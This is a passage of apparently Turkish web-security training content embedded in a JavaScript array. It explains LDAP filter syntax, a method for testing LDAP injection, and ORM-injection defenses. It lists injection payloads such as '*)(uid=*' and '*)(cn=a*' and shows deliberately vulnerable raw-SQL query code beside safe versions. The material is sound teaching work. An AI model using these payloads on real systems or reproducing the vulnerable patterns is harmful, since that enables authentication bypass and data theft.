          <table style="width:100%;border-collapse:collapse;font-size:13px;color:var(--muted); background: rgba(255,255,255,0.02); border-radius:8px; overflow:hidden;">
            <thead>
              <tr style="border-bottom:1px solid var(--glass);">
                <th style="text-align:left;padding:8px;color:#cbd5e1;">Operatör</th>
                <th style="text-align:left;padding:8px;color:var(--accent);">Anlamı</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>=</code></td><td style="padding:8px;">Eşittir (equal to)</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>&amp;</code></td><td style="padding:8px;">Mantıksal VE (AND)</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>|</code></td><td style="padding:8px;">Mantıksal VEYA (OR)</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>!</code></td><td style="padding:8px;">Mantıksal DEĞİL (NOT)</td></tr>
              <tr><td style="padding:8px;"><code>*</code></td><td style="padding:8px;">Wildcard - herhangi bir karakter/string</td></tr>
            </tbody>
          </table>
        </div>

        <ul style="list-style:none;padding:0;margin:0 0 15px 0;display:grid;gap:10px">
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <code>(cn=John)</code> → canonical name'i tam olarak "John" olan kayıtları getirir.
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <code>(cn=J*)</code> → canonical name'i "J" ile başlayan tüm kayıtları getirir (wildcard kullanımı).
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <code>(|(sn=a*)(cn=b*))</code> → soyismi "a" ile başlayan <b>VEYA</b> canonical name'i "b" ile başlayan kayıtları getirir. Operatör en başta yazılır ve takip eden tüm parantez grupları o operatöre bağlanır.
          </li>
        </ul>

        <div class="card" style="border-left: 2px solid #f59e0b; background:rgba(245,158,11,0.05);">
          <strong style="color:#f59e0b; font-size:12px;">Neden Önemli?</strong>
          <p class="small" style="margin:4px 0 0 0;">LDAP Injection'ın temel mantığı tam olarak burada yatar: eğer bir parantez <code>)</code> ile filtre erken kapatılabilir ve ardından yeni bir <code>(...)</code> bloğu eklenebilirse, saldırgan orijinal sorgunun mantıksal yapısını tamamen değiştirebilir.</p>
        </div>
      `
    },
    {
      title: "3. LDAP Injection Tespit Metodolojisi",
      content: `
        <p class="small" style="margin-bottom:15px;">SQLi'de olduğu gibi, LDAP Injection için de sistematik bir yaklaşım izlenmelidir. Aşağıdaki adımlara tıklayarak detaylarını görebilirsin.</p>

        <details name="ldapi-methodology" class="sqli-step" open>
          <summary>Adım 1 - Giriş Noktası Tespiti</summary>
          <div class="sqli-step-body">
            <p class="small" style="margin-bottom:5px;">Dizin servisiyle etkileşime giren tüm kullanıcı girdisi noktaları belirlenir: login formları, arama kutuları, filtreleme parametreleri.</p>
            <div class="card" style="margin-top:8px; border-left: 2px solid var(--secondary); background:rgba(6,182,212,0.05);">
              <strong style="color:var(--secondary); font-size:12px;">Tipik Giriş Noktaları</strong>
              <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:5px;white-space:pre-wrap;word-break:break-all;">- Login formları (username/password)
- Kullanıcı/çalışan arama kutuları ("employee search")
- "Şifremi unuttum" akışları
- Adres defteri / dizin listeleme sayfaları</pre>
            </div>
          </div>
        </details>

        <details name="ldapi-methodology" class="sqli-step">
          <summary>Adım 2 - Sözdizimi Bozucu Karakterlerle Test (Syntax Breaking)</summary>
          <div class="sqli-step-body"><br>
            <p class="small" style="margin:0;">Parametreye <code>*</code>, <code>(</code>, <code>)</code>, <code>&amp;</code>, <code>|</code>, <code>\\</code>, <code>NUL</code> gibi özel LDAP karakterleri gönderilerek uygulamanın tepkisi (hata mesajı, boş sonuç, sayfa davranış değişikliği) gözlemlenir.<br>Hata mesajlarında "LDAP", "javax.naming", "com.sun.jndi" gibi ifadeler görülmesi zafiyetin güçlü bir göstergesidir.</p>
          </div><br>
        </details>

        <details name="ldapi-methodology" class="sqli-step">
          <summary>Adım 3 - Wildcard (*) ile Davranış Testi</summary>
          <div class="sqli-step-body"><br>
            <p class="small" style="margin:0;">Girdi doğrudan bir alan yerine wildcard (<code>*</code>) olarak gönderilir. Eğer sanitizasyon yoksa, uygulama tek bir kayıt yerine <b>tüm kayıtları</b> döndürebilir - bu, filtrenin nasıl inşa edildiğine dair önemli bir ipucudur.</p><br>
          </div>
        </details>

        <details name="ldapi-methodology" class="sqli-step">
          <summary>Adım 4 - Filtre Mantığını Manipüle Etme (*)( Enjeksiyonu)</summary>
          <div class="sqli-step-body"><br>
            <p class="small" style="margin:0;">Mevcut filtreyi erken kapatıp yeni bir koşul eklemeyi hedefleyen <code>*)(</code> tarzı payloadlar denenir. Bu, kimlik doğrulama atlatma ve veri sızdırma saldırılarının temelidir (detaylar için Adım 4 ve 5'e bak).</p>
          </div><br>
        </details>

        <details name="ldapi-methodology" class="sqli-step">
          <summary>Adım 5 - Blind LDAP Injection Testleri</summary>
          <div class="sqli-step-body"><br>
            <p class="small" style="margin:0;">Uygulama herhangi bir hata veya veri döndürmüyorsa, sayfanın davranışındaki (yüklenme/yüklenmeme, farklı içerik) True/False farklılıkları üzerinden veri karakter karakter sızdırılmaya çalışılır (detaylar için "Blind LDAP Injection" bölümüne bak).</p>
          </div><br>
        </details>

        <details name="ldapi-methodology" class="sqli-step">
          <summary>Adım 6 - Doğrulama ve Etki Analizi</summary>
          <div class="sqli-step-body"><br>
            <p class="small" style="margin:0;">Zafiyetin gerçek etkisi (kimlik doğrulama atlatma, yetkisiz veri sızdırma, dizin yapısının ifşası) somut şekilde kanıtlanır ve raporlanır.</p>
          </div><br>
        </details>

        <div style="overflow-x:auto; margin-top:18px;">
          <h4 style="font-size:14px; color:var(--accent); margin-bottom:8px;">Hızlı Referans Checklist</h4>
          <table style="width:100%;border-collapse:collapse;font-size:13px;color:var(--muted); background: rgba(255,255,255,0.02); border-radius:8px; overflow:hidden;">
            <thead>
              <tr style="border-bottom:1px solid var(--glass);">
                <th style="text-align:left;padding:8px;color:#cbd5e1;">Adım</th>
                <th style="text-align:left;padding:8px;color:var(--accent);">Açıklama</th>
                <th style="text-align:left;padding:8px;color:var(--secondary);">Örnek</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">Giriş Noktası</td><td style="padding:8px;">Dizinle etkileşen tüm girdileri bul.</td><td style="padding:8px;">Login, arama kutusu</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">Syntax Test</td><td style="padding:8px;">Özel karakterlerle hata tetikle.</td><td style="padding:8px;"><code>*, (, ), &amp;, |</code></td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">Wildcard Test</td><td style="padding:8px;">Tüm kayıtları çekmeyi dene.</td><td style="padding:8px;"><code>username=*</code></td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">Filtre Manipülasyonu</td><td style="padding:8px;">Filtreyi erken kapat, yeni koşul ekle.</td><td style="padding:8px;"><code>*)(uid=*</code></td></tr>
              <tr><td style="padding:8px;">Blind Test</td><td style="padding:8px;">True/False davranış farkını gözlemle.</td><td style="padding:8px;"><code>*)(cn=a*</code></td></tr>
            </tbody>
          </table>
        </div>
      `
    },

    {
      title: "6. Savunma Yaklaşımı (Defansif Kodlama & ORM Injection Korunması)",
      content: `
        <details>
        <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
        <div style="margin-top:10px;">
        <p class="small" style="margin-bottom:15px;">ORM Injection'ı önlemenin temel kuralı basittir: <b>ORM'in sunduğu güvenli (parametreli) API'leri kullan, ham SQL'e kullanıcı girdisini asla string olarak birleştirme.</b></p>

        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);display:block;margin-bottom:6px;">1. ORM'İN GÜVENLİ (NATIVE) SORGU METODLARINI KULLANMAK</strong>
            <p class="small" style="margin-bottom:5px;">ORM'in kendi sağladığı filter/query metodları kullanıldığında, girdi otomatik olarak parametreli hale getirilir ve SQL yorumlanmaz - sadece "veri" olarak işlenir.</p>

            <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#ef4444;"><span style="color:#64748b;">// ❌ HATALI / VULNERABLE (Ham SQL / f-string):</span>
user = User.query.filter(f"username = '{username}' AND password = '{password}'").all()</pre>

            <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:8px 0 0 0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ GÜVENLİ (SQLAlchemy - Native Filter):</span>
user = User.query.filter(User.username == username, User.password == password).all()</pre>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);display:block;margin-bottom:6px;">2. FRAMEWORK BAZLI GÜVENLİ KULLANIM ÖRNEKLERİ</strong>

            <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0 0 8px 0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ Django ORM:</span>
User.objects.filter(username=username, password=password)

<span style="color:#64748b;">// ❌ Django - Vulnerable raw():</span>
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")</pre>

            <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ Laravel Eloquent:</span>
User::where('username', $username)->where('password', $password)->first();

<span style="color:#64748b;">// ❌ Eloquent - Vulnerable whereRaw():</span>
User::whereRaw("username = '$username'")->first();</pre>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);display:block;margin-bottom:6px;">3. RAW SQL KAÇINILMAZSA, PARAMETRELİ BİÇİMDE YAZMAK</strong>
            <p class="small" style="margin-bottom:5px;">Bazı karmaşık sorgular için raw SQL gerekebilir. Bu durumda dahi ORM'in sunduğu <b>bind parameter</b> mekanizması kullanılmalı, asla string concatenation yapılmamalıdır.</p>
            <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ SQLAlchemy - Parametreli Raw SQL:</span>
from sqlalchemy import text
result = session.execute(
    text("SELECT * FROM users WHERE username = :username"),
    {"username": username}
)</pre>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);display:block;margin-bottom:6px;">4. GİRDİ TİPİ DOĞRULAMA & BEYAZ LİSTE (Allowlisting)</strong>
            <p class="small" style="margin-bottom:5px;">Dinamik <code>ORDER BY</code> / kolon adı gibi parametreli sorguyla korunamayan alanlar için beyaz liste (allowlist) uygulanmalıdır.</p>
            <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ Dynamic ORDER BY Güvenlik Kontrolü (SQLAlchemy):</span>
allowed_columns = {'id', 'created_at', 'username'}
sort_column = request.args.get('sort', 'id')

if sort_column not in allowed_columns:
    sort_column = 'id'

query = session.query(User).order_by(getattr(User, sort_column))</pre>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);display:block;margin-bottom:6px;">5. KOD İNCELEME & STATİK ANALİZ (SAST)</strong>
            <p class="small" style="margin:0;">Kod tabanında <code>.raw(), whereRaw(), text(), extra(), createNativeQuery()</code> gibi riskli fonksiyon çağrıları statik analiz araçlarıyla (Semgrep, Bandit, SonarQube) taranmalı ve bu noktalara kullanıcı girdisinin doğrudan geçip geçmediği manuel olarak doğrulanmalıdır.</p>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);display:block;margin-bottom:6px;">6. EN AZ YETKİ PRENSİBİ (Principle of Least Privilege)</strong>
            <p class="small" style="margin:0;">Olası bir zafiyet durumunda hasarı sınırlamak için uygulamanın veritabanı kullanıcısı <code>root</code>/<code>DBA</code> yetkisinde olmamalı; yalnızca ihtiyaç duyulan tablolara sınırlı CRUD izni tanımlanmalıdır (SQLi bölümündeki savunma prensipleriyle birebir aynıdır, çünkü ORM Injection sonuçta bir SQL sorgusuna dönüşür).</p>
          </li>

        </ul>
        </div>
        </details>
      `
    },
  ]
},
